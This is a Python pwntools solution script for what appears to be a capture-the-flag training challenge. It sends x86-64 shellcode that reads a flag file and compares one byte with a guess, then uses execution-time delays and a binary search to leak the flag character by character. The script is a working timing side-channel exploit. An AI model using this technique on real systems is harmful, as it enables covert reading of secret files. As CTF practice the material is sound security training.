from pwn import *
import string

context.arch = "amd64"
context.log_level = "error"
flag = ['0'] * 46

# this shellcode reads the flag, load character at index, compare it with the character we are looking for
# if it is greater than the character we are looking for, it waits for 0.02 seconds if it is smaller it doesnt wait,
# if it find the char waits for 0.02 seconds
def get_shellcode(index,char):
    shellcode = f"""
    open:
        xor rax, rax
        mov rax, 0x02
        mov rdi, 0x0067616c662f6567
        push rdi
        mov rdi, 0x6e656c6c6168632f
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        syscall
        mov rdi, rax
    read:
        xor rax, rax
        mov rdx, 100
        mov rsi, rsp
        syscall
    
        lea rsi, [rsp]
        add rsi, {index}
    check:
        movzx rax, byte ptr [rsi]
        cmp al, {char}
        mov rcx, 60000000
        jg delay_greater
        mov rcx, 80000000
        je delay_equal

        jmp exit
        
    delay_greater:
        dec rcx                
        jnz delay_greater
    
        jmp exit
        
    delay_equal:
        dec rcx                
        jnz delay_equal

    exit:
        mov rax, 60           
        xor rdi, rdi           
        syscall
    """
    return shellcode

# we send the shellcode comparing char at index to the server and measure the time it takes to execute
def get_timing(index, char):
    if args.REMOTE:
        c = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
    else: 
        c = process("./wrapper.py")
    
    c.recvuntil(b"Shellcode: ")
    shellcode = asm(get_shellcode(index, char))
    c.sendline(shellcode + b"\x90" * (1024 - len(shellcode)))
    c.recvline()
    timing = c.recvline()
    c.close()
    return timing
def binary_search(low, high, index):

    if high >= low:
        char = (high + low) // 2
        # print(f"Checking char {chr(char)} at index {mid}")
        timing = get_timing(index, char)

        # the character found
        if b"0.03" in timing:
            return char
        # character is greater than the middle element
        if b"0.02" in timing:   
            return binary_search(char + 1, high, index)
        # the character is smaller than the middle element
        elif b"0.00" in timing:
            return binary_search(low,  char -1, index)
    
    else:
        return -1


for index in range(41):
    
    char = binary_search(0x21, 0x7f, index)
    if char != -1:
        print(f"Found the character {chr(char)} at index {index}")
        flag[index] = chr(char)

print("".join(flag))

# print(get_timing(0, 0x65)) 